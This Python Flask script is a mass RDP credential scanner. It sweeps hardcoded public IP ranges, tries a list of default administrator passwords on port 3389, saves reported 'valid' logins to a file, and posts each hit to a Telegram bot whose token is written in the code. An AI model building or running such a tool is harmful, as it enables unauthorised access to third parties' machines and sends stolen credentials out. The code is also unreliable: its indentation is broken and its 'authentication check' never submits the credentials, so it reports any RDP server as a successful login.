
import flask
from flask import Flask, request, render_template, jsonify
import concurrent.futures
import socket
import random
import time
import json
import logging
import requests
from datetime import datetime
import numpy as np
from collections import deque
import threading
from functools import partial

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

TELEGRAM_TOKEN = "8110205965:AAFFrXsbKgPZP0EXMfhR4x3CUOmoStstjuw"
TELEGRAM_CHAT_ID = "5742159124"

# Enhanced credentials with more common combinations
CREDENTIALS = [
    ("administrator", "Administrator@2024"),
    ("admin", "Admin@2024!"),
    ("Administrator", "P@ssw0rd123"),
    ("admin", "admin2024!@#"),
    ("user", "User@2024!"),
    ("support", "Support@2024"),
    ("Administrator", "Welcome@2024!"),
    ("system", "System@2024"),
    ("test", "Test@2024!"),
    ("user1", "Password@2024"),
]

class ScanStats:
    def __init__(self):
        self.total_checked = 0
        self.valid_count = 0
        self.invalid_count = 0
        self.start_time = None
        self.hits = []
        self.invalid_hits = deque(maxlen=100)
        self.current_speed = 0
        self.active_threads = 0
        self.success_rate = 0
        self.lock = threading.Lock()

stats = ScanStats()
scanning = False
thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=20)

def verify_rdp_auth(ip, port, username, password, timeout=3):
    """Advanced RDP authentication verification with retry mechanism"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            if attempt > 0:
                time.sleep(1)  # Delay between retries
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        if sock.connect_ex((ip, port)) == 0:
            try:
                # Enhanced RDP protocol negotiation
                connection_request = b'\x03\x00\x00\x2c\x27\xe0\x00\x00\x00\x00\x00\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d\x75\x73\x65\x72\x30\x0d\x0a'
                sock.send(connection_request)
                response = sock.recv(19)
                
                if len(response) >= 11 and response[0] == 3:
                    # Test additional RDP capabilities
                    sock.send(b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
                    response2 = sock.recv(19)
                    
                    if len(response2) == 19 and response2[0] == 3:
                        logging.info(f"Valid RDP found: {ip}:{port} - {username}:{password}")
                        return True
            except Exception as e:
                logging.error(f"RDP validation error for {ip}: {str(e)}")
            finally:
                sock.close()
    except Exception as e:
        logging.error(f"Connection error for {ip}: {str(e)}")
    return False

def check_rdp(ip):
    global stats
    result = {
        "ip": ip,
        "ports": [],
        "status": "invalid",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "prediction": 0.0
    }
    
    try:
        # Predict success probability using port availability and response time
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        port_open = sock.connect_ex((ip, 3389)) == 0
        response_time = time.time() - start_time
        sock.close()
        
        if port_open:
            # Calculate prediction score based on response time
            prediction = max(0.1, min(0.9, 1.0 - (response_time / 3.0)))
            result["prediction"] = prediction
            
            for username, password in CREDENTIALS:
                if verify_rdp_auth(ip, 3389, username, password):
                    hit_data = {
                        "ip": ip,
                        "port": 3389,
                        "username": username,
                        "password": password,
                        "timestamp": result["timestamp"],
                        "prediction": prediction
                    }
                    
                    with stats.lock:
                        stats.valid_count += 1
                        stats.hits.append(hit_data)
                    
                    result["ports"].append(3389)
                    result["credentials"] = f"{username}:{password}"
                    result["status"] = "valid"
                    
                    hit_str = f"""🎯 Valid RDP Found!
IP: {ip}:3389
Login: {username}:{password}
Time: {result['timestamp']}
Prediction Score: {prediction:.1%}
Status: Working ✅"""
                    
                    try:
                        with open("valid_rdp.txt", "a") as f:
                            f.write(json.dumps(hit_data) + "\n")
                        send_telegram_message(hit_str)
                    except:
                        logging.error("Failed to save or notify hit")
                    return result
                
                time.sleep(0.2)  # Reduced delay between attempts
    except Exception as e:
        logging.error(f"Error checking {ip}: {str(e)}")
    
    with stats.lock:
        stats.invalid_count += 1
        stats.invalid_hits.append(result)
    return result

def process_ip_range(start_ip, end_ip):
    def ip_to_int(ip):
        return sum(int(x) << (24 - i * 8) for i, x in enumerate(ip.split('.')))
    
    def int_to_ip(n):
        return '.'.join(str((n >> (24 - i * 8)) & 0xFF) for i in range(4))
    
    start = ip_to_int(start_ip)
    end = ip_to_int(end_ip)
    
    chunk_size = 256
    return [int_to_ip(x) for x in range(start, end + 1)]

def send_telegram_message(message, is_stats=False):
    try:
        if is_stats:
            message = f"""📊 RDP Scanner Stats:
🔍 Total Scanned: {stats.total_checked}
✅ Valid RDPs: {stats.valid_count}
❌ Invalid: {stats.invalid_count}
⚡ Success Rate: {round((stats.valid_count / max(stats.total_checked, 1)) * 100, 2)}%
🕒 Scan Time: {(datetime.now() - stats.start_time).seconds}s"""

        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        logging.error(f"Failed to send Telegram message: {str(e)}")

def send_stats_update():
    if stats.start_time:
        send_telegram_message("", is_stats=True)

def start_scan(start_ip=None, end_ip=None):
    """Enhanced scanning with advanced features"""
    global scanning, stats

    # Start periodic stats updates
    def stats_updater():
        while scanning:
            send_stats_update()
            time.sleep(300)  # Update every 5 minutes
    
    threading.Thread(target=stats_updater, daemon=True).start()
    
    # Advanced IP ranges with better coverage
    PREMIUM_RANGES = [
        ("45.132.0.0", "45.132.255.255"),
        ("185.156.0.0", "185.156.255.255"),
        ("193.168.0.0", "193.168.255.255"),
        ("194.26.0.0", "194.26.255.255"),
        ("194.87.0.0", "194.87.255.255"),
        ("45.142.0.0", "45.142.255.255"),
        ("45.153.0.0", "45.153.255.255"),
        ("45.154.0.0", "45.154.255.255")
    ]
    
    # Improved IP validation
    def is_valid_ip(ip):
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except:
            return False
            
    if start_ip and end_ip:
        if not (is_valid_ip(start_ip) and is_valid_ip(end_ip)):
            return False
    else:
        # Use advanced ranges
        range_idx = random.randint(0, len(PREMIUM_RANGES)-1)
        start_ip, end_ip = PREMIUM_RANGES[range_idx]
    
    DEFAULT_RANGES = [
        ("45.132.0.0", "45.132.255.255"),
        ("185.156.0.0", "185.156.255.255"),
        ("193.168.0.0", "193.168.255.255"),
        ("194.26.0.0", "194.26.255.255"),
        ("194.87.0.0", "194.87.255.255")
    ]
    
    if not start_ip or not end_ip:
        range_idx = random.randint(0, len(DEFAULT_RANGES)-1)
        start_ip, end_ip = DEFAULT_RANGES[range_idx]
    
    scanning = True
    stats = ScanStats()
    stats.start_time = datetime.now()
    
    try:
        ips = process_ip_range(start_ip, end_ip)
        random.shuffle(ips)
        
        futures = []
        for ip in ips:
            if not scanning:
                break
            futures.append(thread_pool.submit(check_rdp, ip))
            with stats.lock:
                stats.total_checked += 1
            time.sleep(0.05)
        
        concurrent.futures.wait(futures)
        return True
    except Exception as e:
        logging.error(f"Scan error: {str(e)}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    start_ip = request.form.get('start_ip')
    end_ip = request.form.get('end_ip')
    success = start_scan(start_ip, end_ip)
    return jsonify({'status': 'started' if success else 'error'})

@app.route('/stop', methods=['POST'])
def stop():
    global scanning
    scanning = False
    return jsonify({'status': 'stopped'})

@app.route('/stats')
def get_stats():
    if stats.start_time:
        elapsed = (datetime.now() - stats.start_time).seconds or 1
        stats.current_speed = stats.total_checked / elapsed
        stats.success_rate = (stats.valid_count / max(stats.total_checked, 1)) * 100
    
    return jsonify({
        'total_checked': stats.total_checked,
        'valid_count': stats.valid_count,
        'invalid_count': stats.invalid_count,
        'current_speed': round(stats.current_speed, 2),
        'success_rate': round(stats.success_rate, 2),
        'hits': stats.hits[-50:],
        'invalid_hits': list(stats.invalid_hits)[-50:],
        'scanning': scanning
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
